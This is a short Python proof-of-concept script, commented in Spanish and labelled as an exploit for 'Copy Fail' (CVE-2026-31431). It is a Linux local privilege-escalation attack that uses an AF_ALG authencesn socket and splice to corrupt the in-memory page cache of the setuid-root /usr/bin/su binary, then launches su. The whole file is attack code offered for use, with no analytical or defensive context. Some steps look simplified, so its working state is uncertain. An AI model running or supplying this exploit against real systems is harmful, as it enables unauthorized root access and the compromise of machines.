#!/usr/bin/env python3
import os, socket, zlib, struct

def exploit():
    # Abrir /usr/bin/su (binario setuid-root)
    fd = os.open("/usr/bin/su", os.O_RDONLY)
    
    # Crear socket AF_ALG con authencesn
    sock = socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0)
    sock.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
    
    # Configurar clave
    SOL_ALG = 279
    key = b'\x00' * 48
    sock.setsockopt(SOL_ALG, socket.ALG_SET_KEY, key)
    
    # Aceptar conexión
    conn, _ = sock.accept()
    
    # Usar splice para escribir en el page cache de /usr/bin/su
    # Esto corrompe el binario en memoria sin tocar el disco
    import ctypes
    libc = ctypes.CDLL("libc.so.6", use_errno=True)
    
    # splice: fd -> pipe -> conn
    pipe_r, pipe_w = os.pipe()
    
    # Escribir payload en el pipe
    payload = b'\x00' * 4
    os.write(pipe_w, payload)
    
    # splice del pipe al socket (corrompe page cache)
    libc.splice(pipe_r, None, conn.fileno(), None, 4, 0)
    
    conn.close()
    sock.close()
    os.close(pipe_r)
    os.close(pipe_w)
    os.close(fd)
    
    print("[*] Page cache corrompido, ejecutando su...")
    os.system("su")

if __name__ == "__main__":
    print("[*] Copy Fail - CVE-2026-31431 PoC")
    exploit()
